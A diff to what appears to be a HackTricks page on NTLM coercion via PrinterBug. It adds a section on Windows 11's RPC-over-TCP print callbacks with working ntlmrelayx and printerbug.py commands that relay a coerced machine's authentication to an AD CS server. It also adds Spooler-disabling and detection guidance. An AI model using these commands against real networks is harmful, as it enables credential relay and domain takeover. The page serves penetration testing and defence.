@@ -74,10 +74,28 @@ coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-prot
 coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
 ```
 
+### Modern RPC-over-TCP callbacks
+
+Do not assume that a successful `RpcRemoteFindFirstPrinterChangeNotificationEx` call must produce traffic on TCP/445. **Windows 11 22H2 and later use RPC over TCP for print communications by default**; RPC over named pipes is disabled unless policy or `RpcUseNamedPipeProtocol=1` restores it. Therefore, legacy SMB-only listeners can report that the trigger was sent while never receiving the callback. Microsoft documents TCP/135 (Endpoint Mapper) plus dynamic RPC ports for normal print RPC, and organizations can restrict this range or select a fixed print RPC port.<sup>[[10]](#references)</sup>
+
+Current **Impacket `ntlmrelayx.py`** includes an RPC relay server and a small Endpoint Mapper, enabled by default on TCP/135. This support was merged in June 2025 specifically with a demonstrated PrinterBug-to-AD-CS chain, allowing the authenticated RPC callback to be relayed even when the victim does not fall back to SMB/WebDAV.<sup>[[11]](#references)</sup>
+
+```bash
+# Recent Impacket: the RPC/EPM listener starts automatically on TCP/135
+# Use --template DomainController instead when coercing a DC
+sudo ntlmrelayx.py -t 'http://ca.corp.local/certsrv/certfnsh.asp' \
+  --adcs --template Machine -smb2support
+
+# Trigger after the listener is ready; use a name/address reachable by the victim
+printerbug.py 'corp.local/user:password'@TARGET ATTACKER_FQDN
+```
+
+Look for `Setting up RPC Server on port 135` and `RPCD: Received connection` in the relay output. If the RPC call returns an expected error but nothing reaches the listener, check the victim's print RPC transport policy, outbound filtering, DNS resolution and whether another process already owns TCP/135. Also ensure that `ntlmrelayx` was not started with `--no-rpc-server`.
+
 ### Forcing HTTP instead of SMB with WebClient
 
-Classic PrinterBug usually yields an **SMB** authentication to `\\attacker\share`, which is still useful for **capture**, **relay to HTTP targets** or **relay where SMB signing is absent**.\
-However, in modern environments, relaying **SMB to SMB** is frequently blocked by **SMB signing**, so operators often prefer to force **HTTP/WebDAV** authentication instead.
+On systems still using **RPC over named pipes** (legacy builds or policy-restored behavior), classic PrinterBug usually yields an **SMB** authentication to `\\attacker\share`, which is still useful for **capture**, **relay to HTTP targets** or **relay where SMB signing is absent**.\
+However, relaying **SMB to SMB** is frequently blocked by **SMB signing**, so operators may prefer to force **HTTP/WebDAV** authentication instead. This is not a fallback for the RPC-over-TCP behavior described above.
 
 If the target has the **WebClient** service running, the listener can be specified in a form that makes Windows use **WebDAV over HTTP**:
 
@@ -91,6 +109,17 @@ This is especially useful when chaining with **`ntlmrelayx --adcs`** or other HT
 ### Combining with Unconstrained Delegation
 
 If an attacker has compromised a computer configured for [Unconstrained Delegation](unconstrained-delegation.md), they can **coerce the printer to authenticate to that computer**. The printer computer account's **TGT** is then cached in memory on the unconstrained-delegation host, where the attacker can retrieve and reuse it with [Pass the Ticket](pass-the-ticket.md).
+
+### Detection and hardening notes
+
+The most reliable way to remove PrinterBug from a DC, PAW or server that does not print is to stop and disable the Spooler. Where printing is required, harden every possible relay destination (SMB server signing, LDAP signing/channel binding and EPA on HTTP services such as AD CS) rather than assuming that blocking TCP/445 on the callback path is sufficient.<sup>[[1]](#references)</sup>
+
+```powershell
+Stop-Service Spooler -Force
+Set-Service Spooler -StartupType Disabled
+```
+
+Detection should correlate an authenticated call to MS-RPRN UUID `12345678-1234-abcd-ef00-0123456789ab`, especially opnum 62/65 with a non-local callback value, and an immediate outbound SMB, HTTP or RPC connection from the spooler host. Baseline **interface UUID/opnum and source/destination pairs**, not only access to `\PIPE\spoolss`, because current print stacks can place the callback on RPC-over-TCP.<sup>[[1]](#references)[[10]](#references)[[11]](#references)</sup>
 
 ## RPC Force authentication
 
@@ -224,5 +253,7 @@ _Remember that in order to crack NTLMv1 you need to set Responder challenge to "
 - [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
 - [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
 - [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
+- [10] [Microsoft – RPC connection updates for print in Windows 11](https://learn.microsoft.com/en-us/troubleshoot/windows-client/printing/windows-11-rpc-connection-updates-for-print)
+- [11] [Fortra Impacket – RPC relay server and Endpoint Mapper for ntlmrelayx](https://github.com/fortra/impacket/pull/1974)
 
 {{#include ../../banners/hacktricks-training.md}}
